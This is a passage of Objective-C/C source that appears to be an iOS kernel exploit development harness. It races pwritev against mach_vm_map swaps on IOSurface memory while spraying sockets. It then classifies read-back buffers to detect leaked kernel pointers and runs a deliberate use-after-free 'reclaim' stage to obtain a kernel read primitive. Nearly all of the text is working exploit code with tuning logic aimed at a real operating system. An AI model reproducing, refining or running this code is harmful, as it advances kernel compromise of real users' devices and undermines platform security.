            uint64_t got = 0; int32_t delta = 0;
            rc_cls_t c = rc_cls(rbBuf, expected, npages, &got, &delta);
            /* v3 calib-aim: on WRONG/FOREIGN (the user's 3+-tap real-content
               hits) classify EVERY qword with the cs2 v3 law — both pointer
               bands (0xfffffff0 = 26.x/23F77, 0xfffffe00 = 24A-band) — then
               walk +/-4 pages in this map hunting the pointer-bearing page.
               THE KPTR ROW HERE = the receipt-class lane on REAL calib hits. */
            if (c == C_WRONG || c == C_FOREIGN || c == C_PARTIAL) {
                static uint64_t calibAim = 0;
                if (calibAim++ < 12) {
                    uint64_t kptrs[8] = {0}; int kn = 0, cont = 0, zro = 0;
                    for (size_t qi = 0; qi < RC_NQ; qi++) {
                        uint64_t q = rbBuf[qi];
                        if (q == hmarker) continue;
                        if (q == 0) { zro++; continue; }
                        if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
                            q >= 0xfffffe0000000000ull) {
                            if (kn < 8) kptrs[kn++] = q;
                        }
                        cont++;
                    }
                    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s",
                           c == C_PARTIAL ? "PARTIAL" : (c == C_WRONG ? "WRONG" : "FOREIGN"),
                           (unsigned long long)cont, (unsigned long long)zro,
                           (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
                    for (int ki = 0; ki < kn; ki++)
                        rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
                    /* the +/-4-page walk anchored at the HIT OFFSET (the
                       v11 unified law from the main copy — the old fixed
                       0x4000 anchor walked the wrong window) */
                    for (int st = 1; st <= 4 && kn == 0; st++) {
                        uint8_t wb[sizeof(rbBuf)];
                        ssize_t wn = pread(fdMark, wb, sizeof(wb), (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size);
                        if (wn < 8) break;
                        uint64_t *wq8 = (uint64_t *)wb;
                        int wkn = 0, wcont = 0; uint64_t wfirst = 0;
                        for (size_t qi = 0; qi < RC_NQ; qi++) {
                            uint64_t q = wq8[qi];
                            if (q == 0) continue;
                            wcont++;
                            if (wfirst == 0) wfirst = q;
                            if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
                                q >= 0xfffffe0000000000ull) wkn++;
                        }
                        if (wcont)
                            rc_log("  AIM-walk +%#02x content=%llu kptr=%llu first=0x%016llx",
                                   (st * 0x4000), (unsigned long long)wcont,
                                   (unsigned long long)wkn, (unsigned long long)wfirst);
                        if (wkn > 0) break;
                    }
                }
            }
            uint64_t *bM0 = isFail ? &flM0 : &okM0;
            uint64_t *bC  = isFail ? &flC  : &okC;
            uint64_t *bW  = isFail ? &flW  : &okW;
            uint64_t *bF  = isFail ? &flF  : &okF;
            uint64_t *bZ  = isFail ? &flZ  : &okZ;
            uint64_t *bP  = isFail ? &flP  : &okP;
            switch (c) {
                case C_M0: (*bM0)++; break;
                case C_CORRECT: (*bC)++; break;
                case C_WRONG:
                    (*bW)++;
                    if (dumped < 10) {
                        rc_log("  WRONG %s off=0x%llx expected=%u got=0x%llx delta=%d w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, expected, got, delta, w);
                        dumped++;
                    }
                    break;
                case C_FOREIGN:
                    (*bF)++;
                    if (dumped < 10) {
                        rc_log("  FOREIGN %s off=0x%llx q0=0x%llx q1=0x%llx w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], w);
                        dumped++;
                    }
                    break;
                case C_ZERO: (*bZ)++; break;
                case C_PARTIAL:
                    (*bP)++;
                    if (rc_hotN < 32) { int dup = 0; for (uint32_t hi = 0; hi < rc_hotN; hi++) if (rc_hotOffs[hi] == (uint64_t)off) { dup = 1; break; } if (!dup) rc_hotOffs[rc_hotN++] = (uint64_t)off; }
                    if (dumped < 6) {
                        rc_log("  PARTIAL %s off=0x%llx q0=0x%llx q1=0x%llx q-1=0x%llx w=%zd",
                               isFail ? "FAIL" : "OK", (uint64_t)off, rbBuf[0], rbBuf[1], rbBuf[RC_NQ-1], w);
                        dumped++;
                    }
                    break;
            }
        }
    }

    rc_log("offsets=%llu ok=%llu fail=%llu mapErr=%llu", nOff, nOk, nFail, rc_mapErr);
    rc_log("OK  : M0=%llu CORRECT=%llu WRONG=%llu FOREIGN=%llu ZERO=%llu PARTIAL=%llu",
           okM0, okC, okW, okF, okZ, okP);
    rc_log("FAIL: M0=%llu CORRECT=%llu WRONG=%llu FOREIGN=%llu ZERO=%llu PARTIAL=%llu",
           flM0, flC, flW, flF, flZ, flP);
    rc_log("spray totals: sockets=%llu", rc_sprayAllocs);
    for (int e = 0; e < 16; e++) if (failErrno[e]) rc_log("  errno %d count=%d", e, failErrno[e]);

    /* v10: persist this boot's hot offsets for future boots (dedup vs warm) */
    if (rc_hotN) {
        int hfd = g_hotPersistFd;
        if (hfd < 0) hfd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (hfd >= 0) {
            rc_log("[hotsync] local hot persist OK (%s)", hotfile);
            char l2[40];
            for (uint32_t i = 0; i < rc_hotN; i++) {
                int dup = 0;
                for (uint32_t k = 0; k < warmN; k++) if (rc_warm[k] == rc_hotOffs[i]) { dup = 1; break; }
                if (!dup) { int n2 = snprintf(l2, sizeof l2, "0x%llx\n", rc_hotOffs[i]); write(hfd, l2, (size_t)n2); }
            }
            close(hfd);
        } else {
            rc_log("[hotsync] local persist FAILED errno=%d", errno);
        }
    }

    /* ---- v10 HOT REPLAY (ID-sweep choreography, unsplit, spray STILL ON) ----
       Evidence 2026-10-24: boot A gave 6 PARTIAL in the ID sweep → v9 split-swap
       on 20 hots → 0 events of ANY class. Two differences conspired to close the
       window: (1) the SPLIT swap replaces the exact swap the window lives on,
       (2) v9 ran after pthread_join(spray) so the kalloc pressure that created
       the window was gone. v10 re-races the hot offsets with the EXACT ID-sweep
       recipe while the spray is still live, 200 tries each. Hot set = this
       boot's PARTIALs ∪ the persisted warm set. WRONG/FOREIGN = cskrw door;
       rising PARTIAL count = the window rate itself (the conversion signal). */
    {
        uint64_t hot[96]; uint32_t nHot = 0;
        for (uint32_t i = 0; i < rc_hotN && nHot < 96; i++) {
            int dup = 0;
            for (uint32_t k = 0; k < nHot; k++) if (hot[k] == rc_hotOffs[i]) { dup = 1; break; }
            if (!dup) hot[nHot++] = rc_hotOffs[i];
        }
        /* v11.1: warm NEWEST-first so the replay leads with fresh offsets */
        for (uint32_t ii = 0; ii < warmN && nHot < 96; ii++) {
            uint32_t i = warmN - 1 - ii;
            int dup = 0;
            for (uint32_t k = 0; k < nHot; k++) if (hot[k] == rc_warm[i]) { dup = 1; break; }
            if (!dup) hot[nHot++] = rc_warm[i];
        }
        rc_log("--- v10 HOT REPLAY: %u offsets (boot %u + warm %u), ID-sweep recipe x200, spray on ---",
               nHot, rc_hotN, warmN);
        uint64_t hw = 0, hf = 0, hp = 0; int hr2 = 0;
        for (uint32_t ho = 0; ho < nHot; ho++) {
            uint64_t off = hot[ho];
            uint32_t pg = (uint32_t)(off / vm_page_size);
            for (int it2 = 0; it2 < 200; it2++) {
                mach_vm_address_t a = pcBig;
                mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                            pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                memset_pattern8((void *)pcBig, &m0, 0x8000);
                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
                struct iovec iovH = { (void *)(pcBig + 0x3f00), 0x4000 };
                rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                rc_raceOn = 1;
                pwritev(fdMark, &iovH, 1, 0x3f00);
                while (rc_raceOn == 1);
                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                uint64_t got = 0; int32_t delta = 0;
                rc_cls_t c2 = rc_cls(rbBuf, pg + 1, npages, &got, &delta);
                if (c2 == C_WRONG) {
                    hw++;
                    if (hr2 < 8) {
                        rc_log("  v10 WRONG hot=0x%llx q0=0x%llx q1=0x%llx (spray page tag, not kptr)",
                               off, rbBuf[0], rbBuf[1]);
                        hr2++;
                    }
                    int wfd = open(wrongfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
                    if (wfd >= 0) {
                        char wl[48];
                        int n = snprintf(wl, sizeof wl, "0x%llx\n", (unsigned long long)off);
                        if (n > 0) write(wfd, wl, (size_t)n);
                        close(wfd);
                    }
                }
                else if (c2 == C_FOREIGN) { hf++; if (hr2 < 8) { rc_log("  v10 FOREIGN hot=0x%llx q0=0x%llx q1=0x%llx (kptr-class if >>36==0xfffffff0)", off, rbBuf[0], rbBuf[1]); hr2++; } }
                else if (c2 == C_PARTIAL) hp++;
            }
        }
        rc_log("v10 tuner: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (boot %u + warm %u hots, ID-recipe x200)",
               hw, hf, hp, rc_hotN, warmN);
        /* v3 bandit hooks: the cscali domain's arm = which spray the tap
           used; FOREIGN>0 and WRONG>0 are the +0.5/+0.6-class outcomes */
        if (g_rcBanditInit == NO) {
            char attr[192];
            (void)LabBanditRegister("cscali",
                                    (const char *const[2]){ "tagged", "untagged" },
                                    2, NULL, 0,
                                    "cscali spray-tag arms (v3: untagged = the guide's #1)",
                                    "survived", "survived", attr, (int)sizeof attr);
            g_rcBanditInit = YES;
        }
        {
            char fs[16], ff[24];
            snprintf(fs, sizeof fs, "%s", g_rcUntagged ? "untagged" : "tagged");
            snprintf(ff, sizeof ff, "0x%llx", (unsigned long long)m0);
            char fw[24], fh[24];
            snprintf(fw, sizeof fw, "%llu", (unsigned long long)hw);
            snprintf(fh, sizeof fh, "%llu", (unsigned long long)hf);
            LabBanditFeat fe[4] = { { "spray", fs }, { "fill", ff },
                                    { "wrong", fw }, { "foreign", fh } };
            LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                hw ? LABB_SIG_SHAPE : "survived",
                                LABB_E_DEVICE, fe, 4);
            if (hf > 0) {
                char fh2[24];
                snprintf(fh2, sizeof fh2, "0x%llx", (unsigned long long)m0);
                LabBanditFeat fe2[1] = { { "fill", fh2 } };
                LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                    LABB_SIG_FOREIGN, LABB_E_DEVICE, fe2, 1);
            }
        }
    }

    rc_go = 0; rc_raceOn = 1;
    rc_sprayGo = 0;
    pthread_join(th, NULL);
    pthread_join(thSpray, NULL);

    /* ---- v9 SPLIT-SAMPLER (secondary, spray OFF — kept as the NEGATIVE
       CONTROL after 10-24 evidence: 20 hot offsets → 0 events. It proves the
       window is schedule-shape-dependent, not a delay-sweep dial.) ---- */
    {
        rc_log("--- v9 split-sampler: %u hot offsets, split-swap delay sweep ---",
               rc_hotN);
        uint64_t hw=0, hf=0, hp=0, hr=0;
        const uint32_t offList[3] = { 0x3c00, 0x3e00, 0x3f00 };  /* boundary grain widths */
        for (uint32_t ho = 0; ho < rc_hotN; ho++) {
            uint64_t off = rc_hotOffs[ho];
            for (int g = 0; g < 3; g++) {
                for (uint32_t dl = 0; dl <= 8; dl++) {
                    useconds_t us = dl ? (1u << (dl - 1)) : 0;
                    mach_vm_address_t a = pcBig;
                    mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                    memset_pattern8((void *)pcBig, &m0, 0x8000);
                    pwrite(fdMark, zreset, sizeof(zreset), offList[g]);
                    struct iovec iov2 = { (void *)(pcBig + offList[g]), 0x4000 };
                    rc_mapAddr = pcBig; rc_mapSize = 0x4000;  /* swap HALF */
                    rc_mapObj = searchObj; rc_mapOff = off;
                    rc_raceOn = 1;
                    ssize_t w = pwritev(fdMark, &iov2, 1, offList[g]);
                    (void)w;
                    if (us) usleep(us);
                    mach_vm_address_t a2 = pcBig;   /* complete second half inline */
                    mach_vm_map(mach_task_self(), &a2, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                    rc_raceOn = 0;
                    pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                    uint64_t got = 0; int32_t delta = 0;
                    rc_cls_t cc = rc_cls(rbBuf, 0, npages, &got, &delta);
                    if (cc == C_WRONG) { hw++; if (hr < 8) { rc_log("  v9 WRONG hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
                    else if (cc == C_FOREIGN) { hf++; if (hr < 8) { rc_log("  v9 FOREIGN hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
                    else if (cc == C_PARTIAL) hp++;
                    else hr += 0;
                }
            }
        }
        rc_log("v9 split-sampler: WRONG=%llu FOREIGN=%llu PARTIAL=%llu (negative control)",
               hw, hf, hp);
    }

    /* ---- v12 RECLAIM: free our page, let the kernel reuse it, re-race
       the same stale index. FOREIGN content in the window = real kread.
       PANIC-POSSIBLE (UAF-class by construction); solo tap, one per
       force-quit; nothing in the existing race bodies is altered. */
    {
        IOSurfaceRef reSurf = pCreate((__bridge CFDictionaryRef)@{
            @"IOSurfaceAllocSize": @(0x8000),
            @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
        if (!reSurf) { rc_log("[v12] surf create fail — stage skipped"); }
        else {
            mach_vm_size_t rsz = 0x8000;
            mach_port_t reObj = 0; mach_vm_address_t reMap = 0;
            kr = mach_make_memory_entry_64(mach_task_self(), &rsz,
                (mach_vm_address_t)pBase(reSurf), VM_PROT_DEFAULT, &reObj, 0);
            if (kr == KERN_SUCCESS)
                kr = mach_vm_map(mach_task_self(), &reMap, 0x8000, 0,
                    VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, reObj, 0, false,
                    VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            if (kr != KERN_SUCCESS) {
                rc_log("[v12] entry/map 0x%x — stage skipped", kr);
                CFRelease(reSurf);
            } else {
                /* fingerprint fill; after release, a post-race window still
                   carrying rfill proves the page was NOT reused (honest
                   negative), anything else foreign-class is the hit */
                static uint64_t rfill = 0, rfill2 = 0;
                rfill  = ((uint64_t)arc4random() << 32) | arc4random();
                rfill2 = ~rfill;
                uint64_t rfillArr[2] = { rfill, rfill2 };
                for (uint32_t wi = 0; wi < 0x8000 / 16; wi++) {
                    uint64_t *w = (uint64_t *)reMap + wi * 2;
                    w[0] = rfill; w[1] = rfill2;
                }
                rc_log("--- v12 RECLAIM: create->fingerprint(0x%016llx)->release->"
                       "re-race (PANIC-POSSIBLE) ---",
                       (unsigned long long)rfill);
                /* RELEASE: the kernel backing of reSurf returns its pages
                   to the free pool (CFRelease drops the last ref; the
                   fingerprint pages are now reclaimable kernel memory) */
                CFRelease(reSurf);
                (void)rfillArr;
                rc_log("[v12] surface released; spray pressure still on (sockets so far: %llu)",
                       rc_sprayAllocs);
                /* re-race the union of this boot's hot offsets via the
                   replay iter choreography — content that is neither our
                   tags nor rfill = foreign kernel reuse in the window */
                uint64_t hw2 = 0, hf2 = 0, hp2 = 0, hown2 = 0, hit2 = 0;
                int aimDumped = 0;
                for (uint32_t ho = 0; ho < rc_hotN + 1 && ho < 24; ho++) {
                    if (rc_hotN == 0 && warmN == 0) break;
                    uint64_t off = (ho < rc_hotN)
                        ? rc_hotOffs[ho] : rc_warm[warmN - 1];
                    uint32_t pg = (uint32_t)(off / vm_page_size);
                    for (int it2 = 0; it2 < 30; it2++) {
                        mach_vm_address_t a = pcBig;
                        mach_vm_map(mach_task_self(), &a, 0x8000, 0,
                            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0,
                            false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                        memset_pattern8((void *)pcBig, &m0, 0x8000);
                        pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
                        struct iovec iov12 = { (void *)(pcBig + 0x3f00), 0x4000 };
                        rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                        rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                        rc_raceOn = 1;
                        pwritev(fdMark, &iov12, 1, 0x3f00);
                        while (rc_raceOn == 1);
                        pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
                        uint64_t got2 = 0; int32_t delta2 = 0;
                        rc_cls_t c12 = rc_cls(rbBuf, pg + 1, npages, &got2, &delta2);
                        if (c12 == C_WRONG) hw2++;
                        else if (c12 == C_FOREIGN) {
                            hf2++;
                            if (hit2 < 4) {
                                /* fingerprint check FIRST: rfill still ours */
                                BOOL ourFp = NO;
                                for (int qi = 0; qi < RC_NQ; qi++)
                                    if (rbBuf[qi] == rfill || rbBuf[qi] == rfill2)
                                        { ourFp = YES; break; }
                                if (ourFp) hown2++;
                                else {
                                    hit2++;
                                    rc_log("  v12 FOREIGN off=0x%llx q0=0x%016llx q1=0x%016llx "
                                           "(kernel reuse candidate)",
                                           (unsigned long long)off, rbBuf[0], rbBuf[1]);
                                    if (aimDumped < 2) {
                                        rc_aim(rbBuf, c12, fdMark, off,
                                               vm_page_size, hmarker);
                                        aimDumped++;
                                    }
                                }
                            }
                        }
                        else if (c12 == C_PARTIAL) {
                            hp2++;
                            if (aimDumped < 2) {
                                rc_aim(rbBuf, c12, fdMark, off,
                                       vm_page_size, hmarker);
                                aimDumped++;
                            }
                        }
                    }
                }
                rc_log("v12 reclaim: WRONG=%llu FOREIGN=%llu (reuse-hits=%llu "
                       "fp-still-ours=%llu) PARTIAL=%llu",
                       hw2, hf2, hit2, hown2, hp2);
                if (hit2 > 0) {
                    /* the bandit scores the foreign read immediately */
                    char fh12[24];
                    snprintf(fh12, sizeof fh12, "%llu", (unsigned long long)hit2);
                    LabBanditFeat fe12[2] = { { "stage", "v12-reclaim" },
                                              { "foreign", fh12 } };
                    LabBanditRecordFeat("cscali", g_rcUntagged ? 1 : 0,
                                        LABB_SIG_FOREIGN, LABB_E_DEVICE, fe12, 2);
                } else {
                    LabBanditNote("cscali", "v12 reclaim: no foreign reuse captured");
                }
                (void)mach_vm_deallocate(mach_task_self(), reMap, 0x8000);
                (void)mach_port_deallocate(mach_task_self(), reObj);
            }
        }
    }

    rc_log("READ: WRONG/FOREIGN on either path = primitive alive.");
    rc_log("OK=M0 + FAIL=ZERO = swap either loses (copy M0) or wins too early (EFAULT, no copy).");
    rc_log("OK=CORRECT = swap won and pwritev copied M1 correctly (no confusion).");
    rc_log("DONE — paste this text back");

    close(fdZero); close(fdMark);
    if (lockSurf) CFRelease(lockSurf);
    mach_vm_deallocate(mach_task_self(), pcBig, 0x8000);
    mach_vm_deallocate(mach_task_self(), pcSmall, 0x2000);
    mach_vm_deallocate(mach_task_self(), searchMap, searchSize);
    mach_vm_deallocate(mach_task_self(), anonMap, 0x2000);
    mach_port_deallocate(mach_task_self(), pcObjBig);
    mach_port_deallocate(mach_task_self(), pcObjSmall);
    mach_port_deallocate(mach_task_self(), searchObj);
    mach_port_deallocate(mach_task_self(), anonObj);
    CFRelease(surfBig); CFRelease(surfSmall);
    free(zbuf);

done:;
    if (g_rc_log_fd >= 0) { close(g_rc_log_fd); g_rc_log_fd = -1; }
    NSString *result = [g_rc_log_str copy];
    g_rc_log_str = nil;
    return result;
}

@end
